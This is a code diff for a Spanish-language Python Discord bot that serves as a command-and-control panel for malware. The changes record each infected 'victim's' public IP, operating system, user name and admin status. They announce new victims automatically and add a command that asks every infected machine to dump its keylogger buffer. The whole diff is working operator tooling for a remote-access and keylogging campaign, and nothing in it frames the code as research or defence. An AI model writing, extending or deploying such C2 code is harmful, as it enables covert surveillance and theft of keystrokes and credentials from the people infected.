@@ -54,6 +54,9 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 # Sesiones activas
 active_sessions = {}
 
+# Notificaciones activadas
+notify_enabled = True
+
 
 # ============================================================
 # Logging (integrado de commands.py)
@@ -105,11 +108,47 @@ async def on_message(message):
             active_sessions[session_id] = {
                 'channel': message.channel,
                 'start_time': datetime.now(),
-                'last_seen': datetime.now()
+                'last_seen': datetime.now(),
+                'ip': None,
+                'os': None,
+                'user': None,
+                'admin': None
             }
+            
+            # Extraer info del embed
+            for field in embed.fields:
+                if field.name == "IP Pública":
+                    active_sessions[session_id]['ip'] = field.value
+                elif field.name == "Sistema":
+                    active_sessions[session_id]['os'] = field.value
+                elif field.name == "Usuario":
+                    active_sessions[session_id]['user'] = field.value
+                elif field.name == "Admin":
+                    active_sessions[session_id]['admin'] = field.value
+            
             log_action("NUEVA_SESION", session_id)
+            
+            # Notificación automática
+            if notify_enabled:
+                channel = bot.get_channel(COMMAND_CHANNEL_ID)
+                await channel.send(
+                    f"🔔 **Nueva víctima conectada:** `{session_id}`"
+                )
     
     await bot.process_commands(message)
+
+
+@bot.event
+async def on_command_error(ctx, error):
+    """Manejo de errores de comandos"""
+    if isinstance(error, commands.CommandNotFound):
+        await ctx.send(
+            f"❌ Comando no encontrado. Usa `!help_c2` para ver comandos disponibles."
+        )
+    elif isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send(f"❌ Faltan argumentos. Uso: `{ctx.prefix}{ctx.command.name} {ctx.command.signature}`")
+    else:
+        await ctx.send(f"❌ Error: {str(error)}")
 
 
 # ============================================================
@@ -159,10 +198,10 @@ async def broadcast(ctx, *, msg):
         timestamp=datetime.now()
     )
     
-    for sid in active_sessions:
-        await ctx.send(embed=embed)
-    
-    await ctx.send(f"✅ Broadcast enviado a {len(active_sessions)} sesiones")
+    await ctx.send(embed=embed)
+    await ctx.send(
+        f"✅ Broadcast enviado a {len(active_sessions)} sesiones"
+    )
     log_action("BROADCAST", details=msg)
 
 
@@ -190,6 +229,81 @@ async def cleanup(ctx):
 
 
 @bot.command()
+async def victim(ctx, session_id: str = None):
+    """Muestra información detallada de una víctima"""
+    if not session_id:
+        await ctx.send("❌ Uso: `!victim <session_id>`")
+        return
+
+    if session_id not in active_sessions:
+        await ctx.send(f"❌ Sesión `{session_id}` no encontrada")
+        return
+
+    data = active_sessions[session_id]
+    duration = datetime.now() - data['start_time']
+    hours, remainder = divmod(int(duration.total_seconds()), 3600)
+    minutes, seconds = divmod(remainder, 60)
+
+    embed = discord.Embed(
+        title=f"Víctima: {session_id}",
+        color=0xe74c3c,
+        timestamp=datetime.now()
+    )
+    embed.add_field(name="🌐 IP Pública", value=data.get('ip') or 'N/A', inline=True)
+    embed.add_field(name="💻 Sistema", value=data.get('os') or 'N/A', inline=True)
+    embed.add_field(name="👤 Usuario", value=data.get('user') or 'N/A', inline=True)
+    embed.add_field(name="🔑 Admin", value=data.get('admin') or 'N/A', inline=True)
+    embed.add_field(name="⏱️ Duración", value=f"{hours}h {minutes}m {seconds}s", inline=True)
+    embed.add_field(name="📅 Conectado", value=data['start_time'].strftime("%Y-%m-%d %H:%M:%S"), inline=True)
+
+    await ctx.send(embed=embed)
+    log_action("INFO_VICTIMA", session_id)
+
+
+@bot.command()
+async def notify(ctx, state: str = None):
+    """Activa/desactiva notificaciones de nuevas víctimas"""
+    global notify_enabled
+    if state is None:
+        actual = "✅ Activadas" if notify_enabled else "❌ Desactivadas"
+        await ctx.send(f"🔔 Notificaciones: {actual}\nUso: `!notify on` / `!notify off`")
+        return
+
+    if state.lower() == 'on':
+        notify_enabled = True
+        await ctx.send("✅ Notificaciones **activadas**")
+    elif state.lower() == 'off':
+        notify_enabled = False
+        await ctx.send("❌ Notificaciones **desactivadas**")
+    else:
+        await ctx.send("❌ Uso: `!notify on` / `!notify off`")
+
+    log_action("NOTIFY", details=f"Estado: {state}")
+
+
+@bot.command()
+async def keylog_dump(ctx):
+    """Solicita el volcado del keylogger a todas las víctimas"""
+    if not active_sessions:
+        await ctx.send("🔴 No hay sesiones activas")
+        return
+
+    embed = discord.Embed(
+        title="🔑 Keylog Dump",
+        description="Volcando buffer del keylogger...",
+        color=0xe67e22,
+        timestamp=datetime.now()
+    )
+    
+    await ctx.send(embed=embed)
+    await ctx.send(
+        f"✅ Solicitud enviada a {len(active_sessions)} sesiones.\n"
+        f"Los resultados aparecerán como respuestas en el canal."
+    )
+    log_action("KEYLOG_DUMP", details=f"A {len(active_sessions)} sesiones")
+
+
+@bot.command()
 async def info(ctx):
     """Muestra información del bot"""
     embed = discord.Embed(
@@ -211,13 +325,16 @@ async def info(ctx):
 async def help_c2(ctx):
     """Muestra ayuda del panel"""
     help_text = """
-**Panel de Control C2:**
+**Panel de Control C2 — Comandos:**
 
-`!sessions` - Ver sesiones activas
-`!broadcast <msg>` - Enviar mensaje a víctimas
-`!cleanup` - Limpiar sesiones inactivas
-`!info` - Información del bot
-`!help_c2` - Esta ayuda
+📋 `!sessions` — Ver sesiones activas
+📡 `!broadcast <msg>` — Enviar mensaje a todas las víctimas
+🧹 `!cleanup` — Limpiar sesiones inactivas (>1h)
+📊 `!info` — Información del bot
+🔍 `!victim <id>` — Detalle de una víctima específica
+🔔 `!notify on/off` — Activar/desactivar notificaciones
+🔑 `!keylog_dump` — Solicitar volcado del keylogger
+❓ `!help_c2` — Esta ayuda
     """
     await ctx.send(help_text)
 
